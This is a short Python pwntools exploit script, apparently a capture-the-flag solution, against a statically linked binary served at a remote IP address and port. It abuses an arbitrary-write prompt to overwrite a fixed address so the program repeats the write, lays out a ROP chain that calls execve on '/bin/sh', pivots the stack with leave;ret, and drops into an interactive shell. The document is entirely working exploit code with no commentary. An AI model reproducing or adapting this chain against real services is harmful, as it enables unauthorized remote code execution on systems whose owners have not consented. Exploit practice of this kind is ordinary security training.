from pwn import*
p = process('./main')
p = remote('183.129.189.60',10100)
def m(address,content):
	p.sendlineafter('addr:',p64(address))
	p.sendafter('data:',content)

m(0x4B80B0,p64(0x402CB0) + p64(0x401C1D))
pop_rdx_rsi = 0x44BAF9
mov_rax_rdx = 0x41B380
pop_rdi_ret = 0x401746
pop_rdx_ret = 0x448415
syscall = 0x46F745
binsh = 0x492895
leave_ret = 0x401CF3
ret = 0x401016
m(0x4B80B0 + 0x10,p64(pop_rdx_rsi) + p64(59) + p64(0))
m(0x4B80B0 + 0x10 + 0x18,p64(mov_rax_rdx) + p64(pop_rdi_ret) + p64(binsh))
m(0x4B80B0 + 0x10 + 0x18 + 0x18,p64(pop_rdx_ret) + p64(0) + p64(syscall))
m(0x4B80B0,p64(leave_ret) + p64(ret))
p.interactive()
